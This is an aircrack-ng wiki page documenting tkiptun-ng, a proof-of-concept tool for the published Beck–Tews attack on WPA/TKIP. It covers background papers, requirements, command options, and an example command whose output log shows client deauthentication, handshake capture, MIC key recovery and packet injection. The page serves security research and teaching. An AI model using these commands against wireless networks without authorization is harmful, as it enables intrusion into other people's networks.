Tkiptun-ng is a tool created by Martin Beck aka hirte, a member of aircrack-ng team. This tool is able to inject a few frames into a WPA TKIP network with QoS. He worked with Erik Tews (who created PTW attack) for a conference in [PacSec 2008](http://pacsec.jp/ "http://pacsec.jp/"): “Gone in 900 Seconds, Some Crypto Issues with WPA”.

Tkiptun-ng is the proof-of-concept implementation the WPA/TKIP attack. This attack is described in the paper, [Practical attacks against WEP and WPA](http://dl.aircrack-ng.org/breakingwepandwpa.pdf "http://dl.aircrack-ng.org/breakingwepandwpa.pdf") written by Martin Beck and Erik Tews. The paper describes advanced attacks on WEP and the first practical attack on WPA. An additional excellent references explaining how tkiptun-ng does its magic is this ars technica article [Battered, but not broken: understanding the WPA crack](http://arstechnica.com/security/news/2008/11/wpa-cracked.ars/ "http://arstechnica.com/security/news/2008/11/wpa-cracked.ars/") by Glenn Fleishman.

Basically tkiptun-ng starts by obtaining the plaintext of a small packet and the MIC (Message Integrity Check). This is done via [chopchop](/doku.php?id=chopchoptheory "chopchoptheory")-type method. Once this is done, the MICHAEL algorithm is reversed the MIC key used to protect packets being sent from the AP to the client can be calculated.

At this point, tkiptun-ng has recovered the MIC key and knows a keystram for access point to client communication. Subsequently, using the XOR file, you can create new packets and inject them. The creation and injection are done using the other aircrack-ng suite tools.

[Cryptanalysis of IEEE 802.11i TKIP](http://download.aircrack-ng.org/wiki-files/doc/tkip_master.pdf "http://download.aircrack-ng.org/wiki-files/doc/tkip_master.pdf") by Finn Michael Halvorsen and Olav Haugen, June 2009 provides an excellent detailed description of how tkiptun-ng works. As well, their paper includes detailed descriptions of many other attacks against WEP/WPA/WPA2.

Please remember this is an extremely advanced attack. You must possess advanced linux and aircrack-ng skills to use this tool. DO NOT EXPECT support unless you can demonstrate you have these skills. Novices will NOT BE SUPPORTED.

## General Requirements

Both the AP and the client must support QoS or sometimes called Wi-Fi Multi-media (WMM) on some APs.

The AP must be configured for WPA plus TKIP.

A fairly long rekeying time must be in use such as 3600 seconds. It should be at least 20 minutes.

## Specific Requirements

The network card MAC address used by tkiptun-ng needs to be set to the MAC address of the client you are attacking.

## Why?

This section is very preliminary. As tkiptun-ng works, it goes through various phases. People ask “Why is such and such done?”. This section attempts to answer those questions.

**Question:**

Why is the handshake gathered?

**Answer:**

It is done for debugging reasons. First, so that the temporal keys in tkiptun can be calculated. Second, check them against the calculated values from the plaintext packet.

Another reason, is to check if the AP/client reuses the nonces after a mic shutdown.

## Usage

Usage: tkiptun-ng <options> <replay interface>

Filter options:

* -d dmac : MAC address, Destination
* -s smac : MAC address, Source
* -m len : minimum packet length
* -n len : maximum packet length
* -t tods : frame control, To DS bit
* -f fromds : frame control, From DS bit
* -D : disable AP detection

Replay options:

* -x nbpps : number of packets per second
* -a bssid : set Access Point MAC address
* -c dmac : set Destination MAC address
* -h smac : set Source MAC address
* -F : choose first matching packet
* -e essid : set target AP SSID

Debug options:

* -K prga : keystream for continuation
* -y file : keystream-file for continuation
* -j : inject FromDS packets
* -P pmk : pmk for verification/vuln testing
* -p psk : psk to calculate pmk with essid

Source options:

* -i iface : capture packets from this interface
* -r file : extract packets from this pcap file

* --help : Displays this usage screen
## Usage Examples

The example below is incomplete but it gives some idea of how it looks.

Input:

```
 tkiptun-ng -h 00:0F:B5:AB:CB:9D -a 00:14:6C:7E:40:80 -m 80 -n 100 rausb0
```

Output:

```
 The interface MAC (00:0E:2E:C5:81:D3) doesn't match the specified MAC (-h).
      ifconfig rausb0 hw ether 00:0F:B5:AB:CB:9D
 Blub 2:38 E6 38 1C 24 15 1C CF
 Blub 1:17 DD 0D 69 1D C3 1F EE
 Blub 3:29 31 79 E7 E6 CF 8D 5E
 15:06:48  Michael Test: Successful
 15:06:48  Waiting for beacon frame (BSSID: 00:14:6C:7E:40:80) on channel 9
 15:06:48  Found specified AP
 15:06:48  Sending 4 directed DeAuth. STMAC: [00:0F:B5:AB:CB:9D] [ 0| 0 ACKs]
 15:06:54  Sending 4 directed DeAuth. STMAC: [00:0F:B5:AB:CB:9D] [ 0| 0 ACKs]
 15:06:56  WPA handshake: 00:14:6C:7E:40:80 captured
 15:06:56  Waiting for an ARP packet coming from the Client...
 Saving chosen packet in replay_src-0305-150705.cap
 15:07:05  Waiting for an ARP response packet coming from the AP...
 Saving chosen packet in replay_src-0305-150705.cap
 15:07:05  Got the answer!
 15:07:05  Waiting 10 seconds to let encrypted EAPOL frames pass without interfering.

 15:07:25  Offset   99 ( 0% done) | xor = B3 | pt = D3 |  103 frames written in 84468ms
 15:08:32  Offset   98 ( 1% done) | xor = AE | pt = 80 |   64 frames written in 52489ms
 15:09:45  Offset   97 ( 3% done) | xor = DE | pt = C8 |  131 frames written in 107407ms
 15:11:05  Offset   96 ( 5% done) | xor = 5A | pt = 7A |  191 frames written in 156619ms
 15:12:07  Offset   95 ( 6% done) | xor = 27 | pt = 02 |   21 frames written in 17221ms
 15:13:11  Offset   94 ( 8% done) | xor = D8 | pt = AB |   41 frames written in 33625ms
 15:14:12  Offset   93 (10% done) | xor = 94 | pt = 62 |   13 frames written in 10666ms
 15:15:24  Offset   92 (11% done) | xor = DF | pt = 68 |  112 frames written in 91829ms
 Looks like mic failure report was not detected. Waiting 60 seconds before trying again to avoid the AP shutting down.
 15:18:13  Offset   91 (13% done) | xor = A1 | pt = E1 |  477 frames written in 391139ms
 15:19:32  Offset   90 (15% done) | xor = 5F | pt = B2 |  186 frames written in 152520ms
 Looks like mic failure report was not detected. Waiting 60 seconds before trying again to avoid the AP shutting down.
 15:22:09  Offset   89 (16% done) | xor = 9C | pt = 77 |  360 frames written in 295200ms
 Looks like mic failure report was not detected. Waiting 60 seconds before trying again to avoid the AP shutting down.
 Looks like mic failure report was not detected. Waiting 60 seconds before trying again to avoid the AP shutting down.
 15:26:10  Offset   88 (18% done) | xor = 0D | pt = 3E |  598 frames written in 490361ms
 15:27:33  Offset   87 (20% done) | xor = 8C | pt = 00 |  230 frames written in 188603ms
 15:28:38  Offset   86 (21% done) | xor = 67 | pt = 00 |   47 frames written in 38537ms
 15:29:53  Offset   85 (23% done) | xor = AD | pt = 00 |  146 frames written in 119720ms
 15:31:16  Offset   84 (25% done) | xor = A3 | pt = 00 |  220 frames written in 180401ms
 15:32:23  Offset   83 (26% done) | xor = 28 | pt = 00 |   75 frames written in 61499ms
 15:33:38  Offset   82 (28% done) | xor = 7C | pt = 00 |  141 frames written in 115619ms
 15:34:40  Offset   81 (30% done) | xor = 02 | pt = 00 |   19 frames written in 15584ms
 15:35:57  Offset   80 (31% done) | xor = C9 | pt = 00 |  171 frames written in 140221ms
 15:37:13  Offset   79 (33% done) | xor = 38 | pt = 00 |  148 frames written in 121364ms
 15:38:21  Offset   78 (35% done) | xor = 71 | pt = 00 |   84 frames written in 68872ms
 Looks like mic failure report was not detected. Waiting 60 seconds before trying again to avoid the AP shutting down.
 15:40:55  Offset   77 (36% done) | xor = 8E | pt = 00 |  328 frames written in 268974ms
 Looks like mic failure report was not detected. Waiting 60 seconds before trying again to avoid the AP shutting down.
 15:43:31  Offset   76 (38% done) | xor = 38 | pt = 00 |  355 frames written in 291086ms
 15:44:37  Offset   75 (40% done) | xor = 79 | pt = 00 |   61 frames written in 50021ms
 Looks like mic failure report was not detected. Waiting 60 seconds before trying again to avoid the AP shutting down.
 15:47:05  Offset   74 (41% done) | xor = 59 | pt = 00 |  269 frames written in 220581ms
 15:48:30  Offset   73 (43% done) | xor = 14 | pt = 00 |  249 frames written in 204178ms
 15:49:49  Offset   72 (45% done) | xor = 9A | pt = 00 |  183 frames written in 150059ms
 Looks like mic failure report was not detected. Waiting 60 seconds before trying again to avoid the AP shutting down.
 15:52:32  Offset   71 (46% done) | xor = 03 | pt = 00 |  420 frames written in 344400ms
 15:53:57  Offset   70 (48% done) | xor = 0E | pt = 00 |  239 frames written in 195980ms
 Sleeping for 60 seconds.36 bytes still unknown
 ARP Reply
 Checking 192.168.x.y
 15:54:11  Reversed MIC Key (FromDS): C3:95:10:04:8F:8D:6C:66

 Saving plaintext in replay_dec-0305-155411.cap
 Saving keystream in replay_dec-0305-155411.xor
 15:54:11
 Completed in 2816s (0.02 bytes/s)

 15:54:11  AP MAC: 00:40:F4:77:F0:9B IP: 192.168.21.42
 15:54:11  Client MAC: 00:0F:B5:AB:CB:9D IP: 192.168.21.112
 15:54:11  Sent encrypted tkip ARP request to the client.
 15:54:11  Wait for the mic countermeasure timeout of 60 seconds.
```
## Usage Tips

None at this time.

## Usage Troubleshooting

None at this time.

tkiptun-ng.txt · Last modified: 2009/09/27 16:01 by darkaudax

---

### Page Tools

* [Show pagesource](/doku.php?id=tkiptun-ng&do=edit "Show pagesource [v]")
* [Backlinks](/doku.php?id=tkiptun-ng&do=backlink "Backlinks")
* [Back to top](#dokuwiki__top "Back to top [t]")

Except where otherwise noted, content on this wiki is licensed under the following license: [CC Attribution-Noncommercial-Share Alike 4.0 International](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)
[![CC Attribution-Noncommercial-Share Alike 4.0 International](/lib/images/license/button/cc-by-nc-sa.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en) [![Donate](/lib/tpl/dokuwiki/images/button-donate.gif)](https://www.dokuwiki.org/donate "Donate")
[![Powered by PHP](/lib/tpl/dokuwiki/images/button-php.gif)](https://php.net "Powered by PHP")
[![Valid HTML5](/lib/tpl/dokuwiki/images/button-html5.png)](//validator.w3.org/check/referer "Valid HTML5")
[![Valid CSS](/lib/tpl/dokuwiki/images/button-css.png)](//jigsaw.w3.org/css-validator/check/referer?profile=css3 "Valid CSS")
[![Driven by DokuWiki](/lib/tpl/dokuwiki/images/button-dw.png)](https://dokuwiki.org/ "Driven by DokuWiki")

![](/lib/exe/taskrunner.php?id=tkiptun-ng&1737770382)

